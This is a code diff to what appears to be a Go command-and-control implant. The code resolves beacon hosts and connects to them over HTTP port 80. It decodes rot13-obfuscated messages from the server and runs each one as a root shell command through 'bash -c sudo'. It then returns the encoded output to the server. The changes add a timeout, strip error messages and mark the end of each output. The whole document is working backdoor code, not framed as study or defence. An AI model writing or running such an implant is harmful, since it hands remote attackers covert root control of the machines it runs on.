@@ -21,15 +21,11 @@ func resolveBeaconIPAddr() string {
 	// Resolve ip's of of the beacons
 	for _, element := range beacons {
 		ips, err := net.LookupIP(element)
-		if err != nil {
-			fmt.Print("Error looking up ip\n")
-		} else {
+		if err == nil {
 			for _, ip := range ips {
 				// Send http request to the resolved ip to make sure we can communicate over http
-				conn, err := net.Dial("tcp", (ip.String() + ":80"))
-				if err != nil {
-					fmt.Print("Error connecting to server\n")
-				} else {
+				conn, err := net.DialTimeout("tcp", (ip.String() + ":80"), 10*time.Second)
+				if err == nil {
 					defer conn.Close()
 					fmt.Fprintf(conn, "GET / HTTP/1.1\n")
 					reader := bufio.NewReader(conn)
@@ -106,7 +102,6 @@ func main() {
 					if message != "HTTP/1.1 200 OK\r\n" && !(strings.Contains(message, "Content-Length: ")) && message != "Content-Type: text/plain; charset=utf-8\r\n" && message != "\r\n" {
 						serverMessage := rot13Encrypt(message)
 						if serverMessage != "KEEP_ALIVE\n" {
-
 							// As long as the message is not a KEEP_ALIVE message or apart of the
 							// HTTP header, execute it as a command
 							cmd := exec.Command("bash", "-c", "sudo "+serverMessage)
@@ -115,8 +110,9 @@ func main() {
 								fmt.Println("Error Executing command: ", err)
 								return
 							}
+							finalOutput := string(output) + "END_OF_OUTPUT"
 
-							fmt.Fprintf(serverConn, rot13Encrypt(string(output)))
+							fmt.Fprintf(serverConn, rot13Encrypt(finalOutput))
 						}
 					}
 				}
